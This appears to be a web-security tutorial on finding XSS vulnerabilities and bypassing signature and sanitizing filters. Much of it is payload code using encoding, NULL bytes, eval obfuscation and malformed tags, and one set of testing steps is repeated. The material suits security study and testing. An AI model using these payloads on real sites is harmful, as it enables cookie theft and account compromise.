## Finding and Exploiting XSS Vulnerabilities

A basic approach to identifying XSS vulnerabilities is to use a standard proof-of-concept attack string such as the following:
```
“><script>alert(document.cookie)</script>
```
This string is submitted as every parameter to every page of the application, and responses are monitored for the appearance of this same string. If cases are found where the attack string appears unmodified within the response, the application is almost certainly vulnerable to XSS.

If your intention is simply to identify some instance of XSS within the application as quickly as possible to launch an attack against other application users, this basic approach is probably the most effective, because it can be easily auto- mated and produces minimal false positives. However, if your objective is to perform a comprehensive test of the application to locate as many individual vulnerabilities as possible, the basic approach needs to be supplemented with more sophisticated techniques. There are several different ways in which XSS vulnerabilities may exist within an application that will not be identified via the basic approach to detection:

- Many applications implement rudimentary blacklist-based filters in an attempt to prevent XSS attacks. These filters typically look for expressions such as <script> within request parameters and take some defensive action such as removing or encoding the expression or blocking the request. These filters often block the attack strings commonly employed in the basic approach to detection. However, just because one common attack string is being filtered, this does not mean that an exploitable vulnerability does not exist. As you will see, there are cases in which a working XSS exploit can be created without using <script> tags and even without using commonly filtered characters such as “ < > and /.
 
- The anti-XSS filters implemented within many applications are defective and can be circumvented through various means. For example, suppose that an application strips any <script> tags from user input before it is processed. This means that the attack string used in the basic approach will not be returned in any of the application’s responses. However, it may be that one or more of the following strings will bypass the filter and result in a successful XSS exploit:
 
```  
“><script >alert(document.cookie)</script >
“><ScRiPt>alert(document.cookie)</ScRiPt>
“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00“><script>alert(document.cookie)</script>
```
The first stage in the testing process is to submit a benign string to each entry point and to identify every location in the response where the string is reflected:
 
 1. Choose a unique arbitrary string that does not appear anywhere within the application and that contains only alphabetical characters and there-fore is unlikely to be affected by any XSS-specific filters. For example:

       ```myxsstestdmqlwp```

Submit this string as every parameter to every page, targeting only one parameter at a time.

 2. Monitor the application’s responses for any appearance of this same string. Make a note of every parameter whose value is being copied into the application’s response. These are not necessarily vulnerable, but each instance identified is a candidate for further investigation, as described in the next section.

 3. Note that both GET and POST requests need to be tested. You should include every parameter within both the URL query string and the message body. Although a smaller range of delivery mechanisms exists for XSS vulnerabilities that can be triggered only by a POST request, exploitation is still possible, as previously described.

 4. In any cases where XSS was found in a POST request, use the “change request method” option in Burp to determine whether the same attack could be performed as a GET request.

 5. In addition to the standard request parameters, you should test every instance in which the application processes the contents of an HTTP request header. A common XSS vulnerability arises in error messages, where items such as the Referer and User-Agent headers are copied into the message’s contents. These headers are valid vehicles for delivering a reflected XSS attack, because an attacker can use a Flash object to induce a victim to issue a request containing arbitrary HTTP headers.

 
## Identifying Reflections of User Input
The first stage in the testing process is to submit a benign string to each entry point and to identify every location in the response where the string is reflected.

1. Choose a unique arbitrary string that does not appear anywhere within the application and that contains only alphabetical characters and there-
fore is unlikely to be affected by any XSS-specific filters. For example:

     ```myxsstestdmqlwp```

  Submit this string as every parameter to every page, targeting only one parameter at a time.

2. Monitor the application’s responses for any appearance of this same string. Make a note of every parameter whose value is being copied into the application’s response. These are not necessarily vulnerable, but each instance identified is a candidate for further investigation, as described in the next section.

3. Note that both GET and POST requests need to be tested. You should include every parameter within both the URL query string and the message body. Although a smaller range of delivery mechanisms exists for XSS vulnerabilities that can be triggered only by a POST request, exploitation is still possible, as previously described.

4. In any cases where XSS was found in a POST request, use the “change request method” option in Burp to determine whether the same attack could be performed as a GET request.

5. In addition to the standard request parameters, you should test every instance in which the application processes the contents of an HTTP request header. A common XSS vulnerability arises in error messages, where items such as the Referer and User-Agent headers are copied into the message’s contents. These headers are valid vehicles for delivering a reflected XSS attack, because an attacker can use a Flash object to induce a victim to issue a request containing arbitrary HTTP headers.

## Testing Reflections to Introduce Script

You must manually investigate each instance of reflected input that you have identified to verify whether it is actually exploitable. In each location where data is reflected in the response, you need to identify the syntactic context of that data. You must find a way to modify your input such that, when it is copied into the same location in the application’s response, it results in execution of arbitrary script. Let’s look at some examples.

Example 1: A Tag Attribute Value
Suppose that the returned page contains the following:
 
```<input type=”text” name=”address1” value=”myxsstestdmqlwp”>```

One obvious way to craft an XSS exploit is to terminate the double quotation marks that enclose the attribute value, close the <input> tag, and then employ some means of introducing JavaScript, such as a <script> tag. For example:

 ```“><script>alert(1)</script>```

An alternative method in this situation, which may bypass certain input filters, is to remain within the <input> tag itself but inject an event handler containing JavaScript. For example:
 
```“ onfocus=”alert(1)```
 
## Probing Defense Filters

Very often, you will discover that the server modifies your initial attempted exploits in some way, so they do not succeed in executing your injected script. 
 
If this happens, do not give up! Your next task is to determine what server-side processing is occurring that is affecting your input. There are three broad possibilities:

 - The application (or a web application firewall protecting the application) has identified an attack signature and has blocked your input.

 - The application has accepted your input but has performed some kind of sanitization or encoding on the attack string.

 - The application has truncated your attack string to a fixed maximum length. We will look at each scenario in turn and discuss various ways in which the obstacles presented by the application’s processing can be bypassed.

## Beating Signature-Based Filters
 
 In the first type of filter, the application typically responds to your attack string
with an entirely different response than it did for the harmless string. For
example, it might respond with an error message, possibly even stating that a
possible XSS attack was detected, as shown in Figure 12-8.
 
 If this occurs, the next step is to determine what characters or expressions within your input are triggering the filter. An effective approach is to remove different parts of your string in turn and see whether the input is still being blocked. Typically, this process establishes fairly quickly that a specific expression such as <script> is causing the request to be blocked. You then need to test the filter to establish whether any bypasses exist. There are so many different ways to introduce script code into HTML pages that signature-based filters normally can be bypassed. You can find an alternative means of introducing script, or you can use slightly malformed syntax that browsers tolerate. This section examines the numerous different methods of executing scripts. Then it describes a wide range of techniques that can be used to bypass common filters.
 
 **Bypassing Filters:HTML**
 
Starting with the opening tag name, the most simple and naïve filters can be bypassed simply by varying the case of the characters used:

 ```<iMg onerror=alert(1) src=a>```

Going further, you can insert NULL bytes at any position:
```
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
```
(In these examples, [%XX] indicates the literal character with the hexadecimal ASCII code of XX. When submitting your attack to the application, generally you would use the URL-encoded form of the character. When reviewing the application’s response, you need to look for the literal decoded character being reflected.)

 **TIP** The NULL byte trick works on Internet Explorer anywhere within the HTML page. Liberal use of NULL bytes in XSS attacks often provides a quick way to bypass signature-based filters that are unaware of IE’s behavior. Using NULL bytes has historically proven effective against web application firewalls (WAFs) configured to block requests containing known attack strings. Because WAFs typically are written in native code for performance reasons, a NULL byte terminates the string in which it appears. This prevents the WAF from seeing the malicious payload that comes after the NULL (see Chapter 16 for more details)
 
**Space Following the Tag Name**

 Several characters can replace the space between the tag name and the first attribute name:
``` 
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
```
Note that even where an attack does not require any tag attributes, you should always try adding some superfluous content after the tag name, because this bypasses some simple filters:

 ```<script/anyjunk>alert(1)</script>```
 
**Attribute Values**
 
Within attribute values themselves, you can use the NULL byte trick, and you also can HTML-encode characters within the value:
 
```
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
```
Because the browser HTML-decodes the attribute value before processing it further, you can use HTML encoding to obfuscate your use of script code, thereby evading many filters. For example, the following attack bypasses many filters seeking to block use of the JavaScript pseudo-protocol handler:

 ```<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >```

 When using HTML encoding, it is worth noting that browsers tolerate various deviations from the specifications, in ways that even filters that are aware of HTML encoding issues may overlook. You can use both decimal and hexa-decimal format, add superfluous leading zeros, and omit the trailing semicolon.

The following examples all work on at least one browser:
```
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```
 
**Tag Brackets**

In some situations, by exploiting quirky application or browser behavior, it is possible to use invalid tag brackets and still cause the browser to process the tag in the way the attack requires.

Some applications perform a superfluous URL decode of input after their input filters have been applied, so the following input appearing in a request:

 ```%253cimg%20onerror=alert(1)%20src=a%253e```

is URL-decoded by the application server and passed to the application as:

 ```%3cimg onerror=alert(1) src=a%3e```
 
which does not contain any tag brackets and therefore is not blocked by the input filter. However, the application then performs a second URL decode, so
the input becomes:
 
```<img onerror=alert(1) src=a>```
 
which is echoed to the user, causing the attack to execute.

**Glyphs**
 
As described in Chapter 2, something similar can happen when an application framework “translates” unusual Unicode characters into their nearest ASCII
equivalents based on the similarity of their glyphs or phonetics. For example, the following input uses Unicode double-angle quotation marks (%u00AB and
%u00BB) instead of tag brackets:
 
```«img onerror=alert(1) src=a»```
 
The application’s input fi lters may allow this input because it does not contain any problematic HTML. However, if the application framework translates the quotation marks into tag characters at the point where the input is inserted into a response, the attack succeeds. Numerous applications have been found vulnerable to this kind of attack, which developers may be forgiven for overlooking.
 
Some input filters identify HTML tags by simply matching opening and closing angle brackets, extracting the contents, and comparing this to a blacklist
of tag names. In this situation, you may be able to bypass the filter by using superfluous brackets, which the browser tolerates:

 ```<<script>alert(1);//<</script>```

In some cases, unexpected behavior in browsers’ HTML parsers can be leveraged to deliver an attack that bypasses an application’s input filters. For example, the following HTML, which uses ECMAScript for XML (E4X) syntax, does not contain a valid opening script tag but nevertheless executes the enclosed script on current versions of Firefox:

 ```<script<{alert(1)}/></script>```
 
TIP In several of the filter bypasses described, the attack results in HTML that is malformed but is nevertheless tolerated by the client browser. Because numerous quite legitimate websites contain HTML that does not strictly comply to the standards, browsers accept HTML that is deviant in all kinds of ways. They effectively fix the errors behind the scenes before the page is rendered. Often, when you are trying to fine-tune an attack in an unusual situation, it can be helpful to view the virtual HTML that the browser constructs out of the server’s actual response. In Firefox, you can use the WebDeveloper tool, which contains a View Generated Source function that performs precisely this task.

 **Character Sets**

 In some situations, you can employ a powerful means of bypassing many types of filters by causing the application to accept a nonstandard encoding of your attack payload. The following examples show some representations of the string 
 
 ```<script>alert(document.cookie)</script>``` 
 
in alternative character sets:

**UTF-7**
 
```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```
 
**US-ASCII**
 
```
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE ; script¾
```

**UTF-16**
 
```
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>. 
``` 
 
**Using JavaScript Escaping**
 
JavaScript allows various kinds of character escaping, which you can use to avoid including required expressions in their literal form. Unicode escapes can be used to represent characters within JavaScript keywords, allowing you to bypass many kinds of filters:
 
```
<script>a\u006cert(1);</script>
```

If you can make use of the ```eval``` command, possibly by using the preceding technique to escape some of its characters, you can execute other commands by passing them to the ```eval``` command in string form. This allows you to use various string manipulation techniques to hide the command you are executing. Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes:

```
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>
```

Furthermore, superfluous escape characters within strings are ignored:

```
<script>eval(‘a\l\ert\(1\)’);</script>
```

**Dynamically Constructing Strings**

You can use other techniques to dynamically construct strings to use in your attacks:

```
<script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
```

The final example, which works on Firefox, allows you to decode a Base64-encoded command before passing it to ```eval```
 
**Alternatives to eval**

If direct calls to the eval command are not possible, you have other ways to execute commands in string form:
 
```
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
```

**Alternatives to Dots**

If the dot character is being blocked, you can use other methods to perform dereferences:

```
<script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>
```
 
**Combining Multiple Techniques**

The techniques described so far can often be used in combination to apply several layers of obfuscation to your attack. Furthermore, in cases where JavaScript is being used within an HTML tag attribute (via an event handler, scripting pseudo-protocol, or dynamically evaluated style), you can combine these techniques with HTML encoding. The browser HTML-decodes the tag attribute value before the JavaScript it contains is interpreted. In the following example, the “e” character in “alert” has been escaped using Unicode escaping, and the backslash used in the Unicode escape has been HTML-encoded:

```
<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
```

Of course, any of the other characters within the onerror attribute value could also be HTML-encoded to further hide the attack:

```
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
#x29;&#x27;&#x29; src=a>
```

This technique enables you to bypass many filters on JavaScript code, because you can avoid using any JavaScript keywords or other syntax such as quotes, periods, and brackets
 
**Using Encoded Scripts**

On Internet Explorer, you can use Microsoft’s custom script-encoding algorithm to hide the contents of scripts and potentially bypass some input filters:

```
<img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a>
<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
```
This encoding was originally designed to prevent users from inspecting client-side scripts easily by viewing the source code for the HTML page. It has since been reverse-engineered, and numerous tools and websites will let you decode encoded scripts. You can encode your own scripts for use in attacks via Microsoft’s command-line utility srcenc in older versions of Windows.
 
**Beating Sanitization** 
 
When you encounter this defense, your first step is to determine precisely which characters and expressions are being sanitized, and whether it is still possible to carry out an attack without directly employing these characters and expressions. For example, if your data is being inserted directly into an existing script, you may not need to employ any HTML tag characters. Or, if the application is removing <script> tags from your input, you may be able to use a different tag with a suitable event handler. Here, you should consider all the techniques already discussed for dealing with signature-based filters, including using layers of encoding, NULL bytes, nonstandard syntax, and obfuscated script code. By modifying your input in the various ways described, you may be able to devise an attack that does not contain any of the characters or expressions that the filter is sanitizing and therefore successfully bypass it. If it appears impossible to perform an attack without using input that is being sanitized, you need to test the effectiveness of the sanitizing filter to establish whether any bypasses exist.

 
 As described in Chapter 2, several mistakes often appear in sanitizing filters. Some string manipulation APIs contain methods to replace only the first instance of a matched expression, and these are sometimes easily confused with methods that replace all instances. So if <script> is being stripped from your input, you should try the following to check whether all instances are being removed:
 
```
<script><script>alert(1)</script>
```
 
In this situation, you should also check whether the sanitization is being performed recursively:

```
<scr<script>ipt>alert(1)</script>
```

Furthermore, if the filter performs several sanitizing steps on your input, you should check whether the order or interplay between these can be exploited.
For example, if the filter strips ```<script>``` recursively and then strips ```<object>``` recursively, the following attack may succeed:

```
<scr<object>ipt>alert(1)</script>
```

 When you are injecting into a quoted string in an existing script, it is common to find that the application sanitizes your input by placing the backslash character before any quotation mark characters you submit. This escapes your quotation marks, preventing you from terminating the string and injecting arbitrary script. In this situation, you should always verify whether the backslash character itself is being escaped. If not, a simple filter bypass is possible.
For example, if you control the value foo in:

```
var a = ‘foo’;
```
you can inject:
```
foo\’; alert(1);//
```
 
This results in the following response, in which your injected script executes. Note the use of the JavaScript comment character // to comment out the remainder of the line, thus preventing a syntax error caused by the application’s own string delimiter:

```
var a = ‘foo\\’; alert(1);//’;
```
 

 
References: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwim7cD06oL5AhWZk4kEHcDGAzMQFnoECAYQAQ&url=http%3A%2F%2Fwww.xss-payloads.com%2F&usg=AOvVaw1-hKbfrHEIcldlShn1bjoC
